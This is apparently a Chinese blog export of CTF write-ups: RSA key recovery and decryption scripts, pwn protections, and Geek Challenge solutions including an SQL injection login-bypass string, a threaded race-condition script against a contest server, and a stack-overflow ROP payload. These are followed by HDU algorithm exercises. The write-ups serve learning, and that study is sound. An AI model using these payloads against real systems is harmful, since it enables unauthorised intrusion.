# 四个剪枝 if check_level &gt;= 1: qval = solve_linear(pval, N &amp; mask, mod) if qval is None or not check_val(qval, mask, qmask_msk, qmask_val): continue if check_level &gt;= 2: val = solve_linear(E, 1 + K * (N - pval - qval + 1), mod) if val is None or not check_val(val, mask, dmask_msk, dmask_val): continue if check_level &gt;= 3: val = solve_linear(E, 1 + Kp * (pval - 1), mod) if val is None or not check_val(val, mask, dpmask_msk, dpmask_val): continue if check_level &gt;= 4: val = solve_linear(E, 1 + Kq * (qval - 1), mod) if val is None or not check_val(val, mask, dqmask_msk, dqmask_val): continue if pval * qval == N: #得到答案 print("Kq =", Kq) print("pwned") print("p =", pval) print("q =", qval) p = pval q = qval d = inverse(E, (p - 1) * (q - 1)) print("d =", d) coef = inverse(p, q) from Crypto.PublicKey import RSA print(RSA.construct((N, E, d, p, q, coef)).exportKey().decode()) quit() cands_next.append(pval) if not cands_next: return False cands = cands_next return Truedef check_val(val, mask, mask_msk, mask_val): test_mask = mask_msk &amp; mask test_val = mask_val &amp; mask return val &amp; test_mask == test_valfor K in range(1, E): if K % 100 == 0: print("checking", K) if search(K, 0, 0, check_level=2, break_step=20): print("K =", K) breakfor Kp in range(1, E): if Kp % 1000 == 0: print("checking", Kp) if search(K, Kp, 0, check_level=3, break_step=30): print("Kp =", Kp) breakfor Kq in range(1, E): if Kq % 100 == 0: print("checking", Kq) if search(K, Kp, Kq, check_level=4, break_step=9999): print("Kq =", Kq) break 然后使用openssl进行解密，此处加密填充方式使用的是OAEP padding方式，所以解密时应该注意： 1openssl rsautl -decrypt -inkey private.pem -keyform PEM -in flag.enc -oaep 或者写脚本： 12345678910111213141516# coding=utf-8from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPfrom Crypto.Util import numberwith open('pubkey.pem', 'rb') as f: key = RSA.importKey(f.read()) N = key.n e = key.ewith open('private.pem', 'rb') as f: private = RSA.importKey(f.read()) oaep = PKCS1_OAEP.new(private)with open('flag.enc', 'rb') as f: print(oaep.decrypt(f.read()).decode()) Openssl使用openssl命令 查看公钥pem信息 1openssl rsa -in pubkey.pem -pubin -text -modulus 利用生成私钥解密 1openssl rsautl -decrypt -inkey pkey -in flag.enc -out out.txt 生成私钥 1openssl asn1parse -genconf [config file] -out newkey.der 更多 Medium RSA——Jarvis OJ方法一解压后发现了两个文件，一个.pem文件，一个.enc文件 12RSA Public-Key: (256 bit) Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 65537 (0x10001) Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgMBAAE= -----END PUBLIC KEY----- 使用yafu对模数进行分解得到 12p = 275127860351348928173285174381581152299 q = 319576316814478949870590164193048041239 解密脚本： 123456789101112131415#coding=utf-8import rsaimport gmpye = 65537n = 87924348264132406875276140514499937145050893665602592992418171647042491658461p = 275127860351348928173285174381581152299 q = 319576316814478949870590164193048041239fn = (p-1)*(q-1)d = int(gmpy.invert(e,fn))privateKey = rsa.PrivateKey(n,e,d,p,q) with open("flag.enc","rb") as f: print(rsa.decrypt(f.read(),privateKey).decode())#PCTF&#123;256b_i5_m3dium&#125; 方法二使用RSAtools或者脚本生成密钥文件，使用openssl解密， 私钥生成脚本: 1234567891011121314151617#coding=utf-8import mathfrom Crypto.PublicKey import RSAimport gmpy#生成一个1024位的私钥pri = RSA.generate(1024)pri.e = 65537pri.n = 87924348264132406875276140514499937145050893665602592992418171647042491658461pri.p = 275127860351348928173285174381581152299 pri.q = 319576316814478949870590164193048041239fn = (pri.p-1)*(pri.q-1)pri.d = int(gmpy.invert(pri.e,fn))private = open('private.pem','w')private.write(pri.exportKey())private.close() 使用 1openssl rsautl -decrypt -inkey private.pem -in flag.enc -out out.txt 得到PCTF{256b_i5_m3dium}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>crypto</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[learn_pwn]]></title>
    <url>%2F2019%2F10%2F16%2Flearn-pwn%2F</url>
    <content type="text"><![CDATA[Checksec 这是pwntools附带的一个工具，检测elf运行于哪个平台，开启了什么安全措施，如果用gcc的编译后，默认会开启所有的安全措施 1Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RELRO RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表 Stack 如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过 NX NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过 PIE PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 FORTIFY FORTIFY_SOURCE机制对格式化字符串有两个限制 (1)包含%n的格式化字符串不能位于程序内存中的可写地址。 (2)当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>learn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第十届极客大挑战]]></title>
    <url>%2F2019%2F10%2F15%2F%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%2F</url>
    <content type="text"><![CDATA[Web打比赛前先撸一只猫！ 直接传参： http://118.25.14.40:8110/?cat=dog 得到flag: Syc{I_actu4l1y_Lik3_d0gs} 你看见过我的菜刀么flag:Syc{Such_a_cl3ar_b0y} BurpSuiiiiiit!!!flag：Syc{BurpExtender_Are_guns_F0r_Hack3rs} Easysql 简单sql注入，试试万能密码：用户名：admin&#39; or &#39;1&#39;=&#39;1&#39; or &#39;1&#39;=&#39;1&#39; # 密码随意 得到Syc{sqL_inj3cti0n_1s_re4lly_fUn} 性感潇文清，在线算卦 查看源码: 123456789101112131415161718192021222324252627282930313233343536 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Ayrain&lt;/title&gt; &lt;link rel="stylesheet" type="text/css" href="123.css"/&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="login"&gt; &lt;h4&gt;性感潇文清在线算卦&lt;/h4&gt; &lt;form method="get"&gt; &lt;input type="text" required="required" placeholder="your name" name="u"&gt;&lt;/input&gt; &lt;input type="password" required="required" placeholder="your birthday" name="p"&gt;&lt;/input&gt; &lt;button class="but" type="submit"&gt;算一卦！&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--$savepath = "uploads/" . sha1($_SERVER['REMOTE_ADDR']) . "/"; if (!is_dir($savepath)) &#123; $oldmask = umask(0); mkdir($savepath); umask($oldmask); &#125; if ((@$_GET['u']) &amp;&amp; (@$_GET['p'])) &#123; $content = '***************'; file_put_contents("$savepath" . sha1($_GET['u']), $content); $msg = 'Ding!你的算卦结果就在这儿啦！ ' . $savepath . htmlspecialchars(sha1($_GET['u'])) . ""; echo $msg; usleep(100000); @$content = "you are too slow"; file_put_contents("$savepath" . sha1($_GET['u']), $content); &#125;试试条件竞争吧？--!&gt; 先学一下条件漏洞先： 条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。 1234567891011121314151617181920212223242526# -*- coding: utf-8 -*-import requestsimport hashlibimport threadingurl = "http://148.70.59.198:42534/?u=1&amp;p=1"u = "http://148.70.59.198:42534/uploads/4380dd7bb88ea8bc28acb3f48a4876b857062618/" + hashlib.sha1(b'1').hexdigest()def getflag(): while True: for j in range(50): requests.get(url) for j in range(50): res = requests.get(u) if "slow" not in res.text: print(res.text)threads = 25if __name__ == "__main__": for i in range(threads): t = threading.Thread(target=getflag) t.start() for i in range(threads): t.join() Misc签到Syc{w3lc0me_t0_th3_10th_geek!} 啊啊啊啊啊啊啊！！！我好兴奋！！！ 这个我觉得很有问题，别人说直接在winhex中可以看到，但我这看不见 Syc{Do_You_know_Ayrain} 散打黑客的压缩包 我拼着生命危险从散打黑客的电脑里偷来的压缩包，大家快跟我一起破解开。看看藏着什么东西。 下载下来有一个压缩包，被加密了，使用暴力破解，得到密码为：3130 随后解压，得到另外一个压缩包，还是被加密了，同样用工具进行解密，得到密码7665 解压后，得到一个txt文件： 1234567891011好吧，其实我已经提前破解掉了。由于看到了散打黑客的秘密，我感觉我迟早要被灭口。为了让我发现的秘密能够安全传给下一个人，我决定把这个秘密用数字的方式藏起来。（这个秘密是关于散打黑客的一件特别想要拥有的东西）什么？你不想知道散打黑客秘密，你只想要flag？哎呀，别急嘛。先听我说完，flag会有的。第一个找到我藏起来的散打黑客想要的东西。并且截图发给我的geeker，我请ta豁奶茶！校外的师傅我给你点外卖！（截了图却找不到我的qq号？那就很可惜了23333）咳咳，我的话说完了。去最下面拿你的flag吧少年！！！ 得到Syc{Weak_passwd_are_DANGER0us} 是谁杀了谁 注意自己的HP，别被气死了。 PwnFind tools Find right tools，so easy！nc pwnto.fun 9999 打开连接，看到： 123456Hi boys, this game may be a new things for u. Have fun! I think U will love it! So fun, so easy! The key is : #此处停顿了一下，可能有输出 pwntools is a good tool to complete the game! Can U get password? Input your password: 题目说find tools，里面说pwntools是好工具，现在就可以写脚本捕获输出 123456789101112#coding=utf-8from pwn import *context.log_level = "debug"io = remote("pwnto.fun", 9999)io.recvuntil("The key is :\n")str = io.recvuntil("\rpwntools")#bDF2ZV9sMG5nX2FuZF9wd24=#l1ve_l0ng_and_pwnio.recv() 现在就得到一段字符串，发现是base64加密，这个就是password，输入password，getflag 完整脚本： 12345678910111213141516#coding=utf-8from pwn import *import base64context.log_level = "debug"io = remote("pwnto.fun", 9999)#bDF2ZV9sMG5nX2FuZF9wd24=#l1ve_l0ng_and_pwnio.recvuntil("The key is :\n")str = io.recvuntil("\rpwntools")str = base64.b64decode(str)io.recv()io.send(str)io.interactive() 得到flag:Syc{pwn_1s_s0_fun} Baby rop下载文件分析一下安全设置： 没有打开栈溢出保护，用ida64打开看看源程序： 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v4; // [rsp+0h] [rbp-88h] puts(msg); puts(txt); read(0, &amp;v4, 0x100uLL); return puts(msa);&#125; 存在read函数，所以可以考虑进行栈溢出,查看.data表 由于是静态地址，所以直接使用相应地址,但传参还是使用ROP链进行传参 1234567891011121314╰─○ ROPgadget --binary ./hello --only "pop|ret"Gadgets information============================================================0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400690 : pop r14 ; pop r15 ; ret0x0000000000400692 : pop r15 ; ret0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400520 : pop rbp ; ret0x0000000000400693 : pop rdi ; ret #可用0x0000000000400691 : pop rsi ; pop r15 ; ret0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400451 : ret 找到一个rdi可用，脚本如下： 12345678#coding=utf-8from pwn import *sh = remote("nc pwnto.fun",10000)payload = 'a'*0x88+'a'*0x8+p64(0x06010AE)sh.send(payload)sh.interactive()sh.close() 得到flag:Syc{S0_easy_and_S0_good} Baby Shellcode 打CSGO，它不香吗？P90 rush b, let&#39;s go. checksec一下： 12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 开启了Full RELRO，无法修改got表，NX保护开启，也就是栈中数据不能执行，可以尝试使用rop进行绕过 用ida打开，查看main函数： 1234567891011121314__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char v4; // [rsp+0h] [rbp-30h] void *buf; // [rsp+28h] [rbp-8h] buf = mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL); sub_400999(1191936LL, 4096LL); sub_400956(); puts("A simple shellcode for U, have fun!"); read(0, buf, 0x64uLL); puts("Why not play CSGO?"); read(0, &amp;v4, 0x64uLL); return 0LL;&#125; mmap可以实现内存共享，那么，我们可以将shellcode写入buf里面， REjiang’s fan 密码都记错？你个假粉丝！！使用ida打开，找到Syc{I_am_4_fan_of_Ji@ng} secret用ida打开，然后发现一行编码： 5379637B6E30775F794F755F6B6E6F775F6234736531367D 像个加密形式，试着解密，开始使用base64进行解码，发现不行，后来使用hex解码得到Syc{n0w_yOu_know_b4se16} Easy VB 我的IDA怎么不能F5了,这可怎么办啊? file一下 1Easy VB.exe: PE32 executable (GUI) Intel 80386, for MS Windows 用ida打开，发现只有一个函数， 冰菓 千反田不小心把重要的东西落在了古典文学社，你能帮她找到吗？ 点开界面，发现： 说点他有惊喜，点几次发现： 使用这个工具进行逆向，找到关键加密函数: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556using System;using System.Text;namespace Bingo&#123; // Token: 0x02000006 RID: 6 public class EncryptStr &#123; // Token: 0x06000013 RID: 19 RVA: 0x00002424 File Offset: 0x00000624 public bool CheckStr(string text) &#123; if (text.Length != 20) &#123; return false; &#125; byte[] bytes = Encoding.ASCII.GetBytes(text); byte[] array = new byte[] &#123; 119, 77, 103, 79, 21, 115, 133, 97, 115, 87, 22, 115, 103, 89, 88, 93, 22, 89, 119, 81 &#125;; byte[] array2 = new byte[] &#123; 57, 13 &#125;; for (int i = 0; i &lt; array.Length; i++) &#123; bytes[i] = Convert.ToByte((int)((bytes[i] ^ array2[0]) + array2[1])); if (bytes[i] != array[i]) &#123; return false; &#125; &#125; return true; &#125; &#125;&#125; 将此函数进行逆向就可得到flag 1234567891011121314151617181920#include&lt;iostream&gt;using namespace std;int main()&#123; int array[20] = &#123;119,77,103,79,21,115,133,97,115,87,22,115,103,89,88,93,22,89,119,81&#125;; int array2[2] = &#123;57,13&#125;; int enc[20]; for(int i = 0 ; i &lt; 20 ; i++) &#123; enc[i] = (array[i]-array2[1])^array2[0]; &#125; for(int i = 0 ; i &lt; 20 ; i++) &#123; printf("%c",enc[i]); &#125; printf("\n"); return 0;&#125; flag:Syc{1_Am_s0_curi0uS} PYC是啥子嘛? 听说py不需要逆向，那pyc呢，pyc是什么呢？ 在线工具逆向： 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python# encoding: utf-8# 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pycprint 'This is a maze.'print 'Python is so easy.'print 'Plz Input The Shortest Way:'maze = '###########S #@@@@@@##@ #@ ####@ ##@ #@@@ @#@ ##@ ####@#@ ##@ @@@@@#@ #########@ ##E######@ ##@ @@@@@ @ @ ###########'way = raw_input()len = len(way)p = 11#$$$$$$for i in way: if i == '&amp;': p -= 10 if i == '$': p += 10 if i == '6': p -= 1 if i == '3': p += 1 if maze[p] == '#': print 'Your way is wrong' exit(0) break if maze[p] == '@': continue if maze[p] == 'E': print 'You do it,your flag is Syc\\&#123;+Your Input+\\&#125;.' exit(0) continueprint 'May be something wrong.' 逆向脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;stack&gt;#include&lt;queue&gt;#include&lt;string&gt;using namespace std;char maze[101] = "###########S#@@@@@@##@#@####@##@#@@@@#@##@####@#@##@@@@@@#@#########@##E######@##@@@@@@@@###########";int dir[4] = &#123; -10,10,1,-1 &#125;;int vis[100];queue&lt;char&gt; fa;bool check(int x)&#123; if (x &lt; 0 || x &gt; 99) return true; if (vis[x] == 1 || maze[x] == '#') return true; return false;&#125;void bfs()&#123; queue&lt;int&gt; q; memset(vis, 0, sizeof(vis)); int tm = 11; q.push(tm); vis[tm] = 1; while (!q.empty()) &#123; int tm1 = q.front(); q.pop(); int fl; for (int i = 0; i &lt; 4; i++) &#123; fl = tm1 + dir[i]; if (!check(fl)) &#123; q.push(fl); vis[fl] = 1; if (dir[i] == 10) fa.push('&amp;'); else if (dir[i] == -10) fa.push('$'); else if (dir[i] == -1) fa.push('6'); else if (dir[i] == 1) fa.push('3'); if (maze[tm1] == 'E') &#123; return; &#125; &#125; &#125; &#125;&#125;int main()&#123; bfs(); printf("key words:"); while (!fa.empty()) &#123; printf("%c", fa.front()); fa.pop(); &#125; return 0;&#125; 得到字符串$$$$33333&amp;&amp;666&amp;&amp;33333$$$$$$$6666666&amp; 所以flag为：Syc{$$$$33333&amp;&amp;666&amp;&amp;33333$$$$$$$6666666&amp;} AndriodSign_in用jadx-gui进行反编译： 找到关键代码： 1234567891011121314public void onClick(View view) &#123; if (view.getId() != R.id.button) &#123; return; &#125; if (Base64.encodeToString(this.ed.getText().toString().getBytes(), 2).equals(getResources().getString(R.string.sign_in)) != null) &#123; CharSequence charSequence = "Right"; this.tv.setText(charSequence); Toast.makeText(this, charSequence, 1).show(); return; &#125; this.tv.setText("Try again"); Toast.makeText(this, "False", 1).show(); &#125;&#125; getString函数通过id查找字符串,在resource文件查找 一段base64码，直接解密：Syc{Si9n_1n_I3_E4sy!} CodingDragon Quest 按照题目要求编写C语言程序 12345678910111213141516171819202122232425262728293031323334353637383940414243Program description:The brave initially has 100 HP and 0 LV. He will face 3 challenges before facing the BOSS. There are three monsters for each challenge. The number represents the attack power of the monster. The brave must choose one of them to challenge. Each challenge a monster, the brave will deduct the corresponding HP and raise the same number of levels. In order to challenge the BOSS, the LV of the brave must ≥ 60 and keep HP as much as possible.The following conditions:1. Brave can face BOSS printf("The brave still has %dHP left to face the BOSS",HP);2. The level of the brave will definitely be less than 60 printf("why don't give the brave a chance to level up...");3. The brave will definitely die on the way to upgrade printf("The brave died on the way to leveling...");4. The attack power of the monster is less than or equal to 0.(As long as the monster attack power is less than or equal to 0, only this one is output.) printf("The monster is too weak...");Input1:(Each row represents a challenge)30 90 3050 80 3040 90 20Output1:The brave still has 20HP left to face the BOSStip:num[0][0]=30--&gt;num[1][2]=30--&gt;num[2][2]=20,LV=30+30+20,HP=100-30-30-20Input2:(Each row represents a challenge)100 100 100100 100 100100 100 100Output2:The brave died on the way to leveling...Please input your code: 直接编程就行,注意一定是C语言，C++都不行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int num[3][3];int finmin(int* x)&#123; int min=x[0]; if(min &gt; x[1]) &#123; min = x[1]; &#125; else if(min &gt; x[2]) &#123; min = x[2]; &#125; return min;&#125;int main()&#123; memset(num,0,sizeof(num)); for(int i = 0 ; i &lt; 3 ; i++) &#123; for(int j = 0 ; j &lt; 3 ; j++) &#123; scanf("%d",&amp;num[i][j]); &#125; &#125; int level1 = finmin(num[0]); int level2 = finmin(num[1]); int level3 = finmin(num[2]); int hp = 100-level1-level2-level3; int lv = level1+level2+level3; if(level1&lt;= 0 || level2 &lt;= 0 || level3 &lt;= 0) &#123; printf("The monster is too weak..."); return 0; &#125; if(lv &lt; 60) &#123; printf("why don't give the brave a chance to level up..."); return 0; &#125; if(hp &lt;= 0) &#123; printf("The brave died on the way to leveling..."); return 0; &#125; else &#123; printf("The brave still has %dHP left to face the BOSS",hp); return 0; &#125;&#125;]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Contest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HDU_Problem_exercise]]></title>
    <url>%2F2019%2F10%2F14%2FHDU-Problem-exercise%2F</url>
    <content type="text"><![CDATA[又开始捡起自己的算法练习篇~~ 1006 Tick and TickProblem Description 1The three hands of the clock are rotating every second and meeting each other many times everyday. Finally, they get bored of this and each of them would like to stay away from the other two. A hand is happy if it is at least D degrees from any of the rest. You are to calculate how much time in a day that all the hands are happy. Input 1The input contains many test cases. Each of them has a single line with a real number D between 0 and 120, inclusively. The input is terminated with a D of -1. Output 1For each D, print in a single line the percentage of time in a day that all of the hands are happy, accurate up to 3 decimal places. Sample Input 1234012090-1 Sample Output 123100.0000.0006.251 题意： 时钟的三个指针，在他们之间的角度大于D度时，可以认为是happy，求一天中的happy时间占的百分比 分析：由于12小时后，时针、分针、看到这个首先想到的追击与相遇问题，我们可以将时、分、秒针的速度统一单位，然后可以求出相对速度。得到相对速度之后单独对两个针分析(由于是三个角度都需要大于D)，由此得到两针相差一度所需要的时间，那么最晚达到D度和最早结束D度之间的区间时间就是happy-time，然后就考虑周期的问题，但最早结束的应该转到下一个满足条件状态（加上一个周期)。最后记得我们是勇12小时来计算的，即43200s 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include&lt;stdio.h&gt;double max(double a,double b,double c)&#123; return a&gt;b?(a&gt;c?a:c):(b&gt;c?b:c);&#125;double min(double a,double b,double c)&#123; return a&lt;b?(a&lt;c?a:c):(b&lt;c?b:c);&#125;int main()&#123; double d; //需要间隔的度数 double c_sm = 3600*1.0/59; double c_sh = 43200*1.0/719; double c_mh = 43200*1.0/11; //这三行是时针、分针、秒针相遇的周期 double sum; double happys,happye; //开始happy和结束happy double sm = 10*1.0/59; double sh = 120*1.0/719; double mh = 120*1.0/11; //这是相差一度需要的时间 double d_sm,d_sh,d_mh,not_d_sm,not_d_sh,not_d_mh;//表示相差d°及以上的时刻和不再相差d°及以上的时刻 while(~scanf("%lf",&amp;d)&amp;&amp;d!=-1)&#123; sum = 0; d_sm=sm*d; not_d_sm=c_sm-d_sm; d_sh=sh*d; not_d_sh=c_sh-d_sh; d_mh=mh*d; not_d_mh=c_mh-d_mh; happys=max(d_sm,d_sh,d_mh); happye=min(not_d_sm,not_d_sh,not_d_mh); //happy区间应该选择最晚开始的和最早结束的 while(happys&lt;=43200&amp;&amp;happye&lt;=43200)//43200是时针针转一圈的秒数 &#123; happys=max(d_sm,d_sh,d_mh);//两两之间最后一个满足相差d°及以上的条件视为开始happy时刻 happye=min(not_d_sm,not_d_sh,not_d_mh);//两两之间第一个不再满足相差d°及以上视为结束happy的时刻 if(happys&lt;happye) sum+=happye-happys;//如果end的时间比start的晚,由sum记录并累积 if(happye==not_d_sm) &#123;d_sm+=c_sm;not_d_sm+=c_sm;&#125; else if(happye==not_d_sh) &#123;d_sh+=c_sh;not_d_sh+=c_sh;&#125; else if(happye==not_d_mh) &#123;d_mh+=c_mh;not_d_mh+=c_mh;&#125;//happy时间end后最慢的指针要提前一个周期才能让比它快的再次追上 &#125; printf("%.3lf\n",sum/43200*100); &#125; return 0;&#125; 1007 Quoit DesignProblem Description 1234Have you ever played quoit in a playground? Quoit is a game in which flat rings are pitched at some toys, with all the toys encircled awarded.In the field of Cyberground, the position of each toy is fixed, and the ring is carefully designed so it can only encircle one toy at a time. On the other hand, to make the game look more attractive, the ring is designed to have the largest radius. Given a configuration of the field, you are supposed to find the radius of such a ring.Assume that all the toys are points on a plane. A point is encircled by the ring if the distance between the point and the center of the ring is strictly less than the radius of the ring. If two toys are placed at the same point, the radius of the ring is considered to be 0. Input 1The input consists of several test cases. For each case, the first line contains an integer N (2 &lt;= N &lt;= 100,000), the total number of toys in the field. Then N lines follow, each contains a pair of (x, y) which are the coordinates of a toy. The input is terminated by N = 0. Output 1For each test case, print in one line the radius of the ring required by the Cyberground manager, accurate up to 2 decimal places. Sample Input 123456789101120 01 121 11 13-1.5 00 00 1.50 Sample Output 1230.710.000.75 ​ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485/*看完题目发现是个最近点对的问题 */#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;cmath&gt;using namespace std;int n;//定义点的结构体 struct Point&#123; double x; double y;&#125;pt[100007];int a[100007];//可以记录大概满足要求的点的下标 //对功能进行函数包装int cmp(Point a,Point b)&#123; if(a.x!=b.x) return a.x&lt;b.x; else return a.y&lt;b.y;&#125;int cmp_y(int i,int j)&#123; return pt[i].y&lt;pt[j].y;&#125; //获取距离 double getdis(Point &amp;a,Point &amp;b)&#123; return sqrt((a.x-b.x)*(a.x-b.x)+(a.y-b.y)*(a.y-b.y));&#125; double solve(int l,int r)&#123; double ans = 0; //只有两个点就直接输出 if(r-l &lt;= 2) &#123; //当两个点重合,返回0 if(r-l == 0) return ans; ans = getdis(pt[l],pt[l+1]); //当只有一个点时，返回ans if(r-l == 1) return ans; for(int i = l ; i &lt;= r ; i++)&#123; for(int j=i+1 ; j &lt;= r ; j++) &#123; ans = min(ans,getdis(pt[i],pt[j])); &#125; &#125; return ans; &#125; //剩下就是多个点的问题了 int m = (l+r)&gt;&gt;1; double temp1 = solve(l,m); double temp2 = solve(m+1,r); ans = min(temp1,temp2); //获取区间中的点，对y坐标进行排序 int k = 0; for(int i = l ; i &lt;= m &amp;&amp; pt[m].x -pt[i].x ; i++) a[k++] = i; for(int j = m+1 ; j &lt;= r &amp;&amp; pt[r].x-pt[j].x ; j++) a[k++] = j; sort(a,a+k,cmp_y); for(int i = 0 ; i &lt; k ; i++) &#123; for(int j = i+1 ; j &lt; k &amp;&amp; j &lt;= i+7 ; j++) &#123; ans = min(ans,getdis(pt[a[i]],pt[a[j]])); &#125; &#125; return ans; &#125;int main()&#123; while(~scanf("%d",&amp;n)&amp;&amp;n) &#123; for(int i = 0 ; i &lt; n ; i++) &#123; scanf("%lf%lf",&amp;pt[i].x,&amp;pt[i].y); &#125; sort(pt,pt+n,cmp); printf("%.2lf\n",solve(0,n-1)*1.0/2); &#125;&#125; 1008 ElevatorProblem Description 12The highest building in our city has only one elevator. A request list is made up with N positive numbers. The numbers denote at which floors the elevator will stop, in specified order. It costs 6 seconds to move the elevator up one floor, and 4 seconds to move down one floor. The elevator will stay for 5 seconds at each stop.For a given request list, you are to compute the total time spent to fulfill the requests on the list. The elevator is on the 0th floor at the beginning and does not have to return to the ground floor when the requests are fulfilled. Input 1There are multiple test cases. Each case contains a positive integer N, followed by N positive numbers. All the numbers in the input are less than 100. A test case with N = 0 denotes the end of input. This test case is not to be processed. Output 1Print the total time on a single line for each test case. Sample Input 1231 23 2 3 10 Sample Output 121741 题意 一个楼梯用于升降，第一个N数为请求数量，随后跟着N个请求，对于上升请求，每上一楼6秒，停5秒，对于下降请求，每下一楼4秒，停5秒。 代码 1234567891011121314151617181920212223#include&lt;iostream&gt;using namespace std;int main()&#123; int n; while(cin&gt;&gt;n&amp;&amp;n) &#123; int now_level = 0; int temp; int sum = 0; for(int i = 0 ; i &lt; n ; i++) &#123; cin&gt;&gt;temp; if(now_level &gt; temp) sum += (now_level-temp)*4 + 5; else sum += (temp - now_level)*6 + 5; now_level = temp; &#125; cout&lt;&lt;sum&lt;&lt;endl; &#125;&#125; 1009 FatMouse’ TradeProblem Description 12FatMouse prepared M pounds of cat food, ready to trade with the cats guarding the warehouse containing his favorite food, JavaBean.The warehouse has N rooms. The i-th room contains J[i] pounds of JavaBeans and requires F[i] pounds of cat food. FatMouse does not have to trade for all the JavaBeans in the room, instead, he may get J[i]* a% pounds of JavaBeans if he pays F[i]* a% pounds of cat food. Here a is a real number. Now he is assigning this homework to you: tell him the maximum amount of JavaBeans he can obtain. Input 1The input consists of multiple test cases. Each test case begins with a line containing two non-negative integers M and N. Then N lines follow, each contains two non-negative integers J[i] and F[i] respectively. The last test case is followed by two -1’s. All integers are not greater than 1000. Output 1For each test case, print in a single line a real number accurate up to 3 decimal places, which is the maximum amount of JavaBeans that FatMouse can obtain. Sample Input 1234567895 37 24 35 220 325 1824 1515 10-1 -1 Sample Output 1213.33331.500 题意 M吨猫粮， 分析 尝试贪心 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;struct food&#123; double J; double F; double value;&#125;M[1005];//按照权重贪心 bool cmp(food a,food b)&#123; return a.value&gt;b.value;&#125;int main()&#123; int m,n; while(cin&gt;&gt;m&gt;&gt;n &amp;&amp; (m!=-1 &amp;&amp; n!=-1)) &#123; double sum = 0; for(int i = 0 ; i &lt; n ; i++) &#123; cin&gt;&gt;M[i].J&gt;&gt;M[i].F; M[i].value = M[i].J*1.0/M[i].F; &#125; sort(M,M+n,cmp); for(int i = 0 ; i &lt; n; i++) &#123; if(M &lt; 0) break; if(M[i].F &gt; m) &#123; sum += m*1.0*M[i].J/M[i].F; m = 0; &#125; else &#123; sum += M[i].J; m -= M[i].F; &#125; &#125; printf("%.3lf\n",sum); &#125;&#125; 1010 Tempter of the BoneProblem Description 123The doggie found a bone in an ancient maze, which fascinated him a lot. However, when he picked it up, the maze began to shake, and the doggie could feel the ground sinking. He realized that the bone was a trap, and he tried desperately to get out of this maze.The maze was a rectangle with sizes N by M. There was a door in the maze. At the beginning, the door was closed and it would open at the T-th second for a short period of time (less than 1 second). Therefore the doggie had to arrive at the door on exactly the T-th second. In every second, he could move one block to one of the upper, lower, left and right neighboring blocks. Once he entered a block, the ground of this block would start to sink and disappear in the next second. He could not stay at one block for more than one second, nor could he move into a visited block. Can the poor doggie survive? Please help him. Input 12345678The input consists of multiple test cases. The first line of each test case contains three integers N, M, and T (1 &lt; N, M &lt; 7; 0 &lt; T &lt; 50), which denote the sizes of the maze and the time at which the door will open, respectively. The next N lines give the maze layout, with each line containing M characters. A character is one of the following:‘X’: a block of 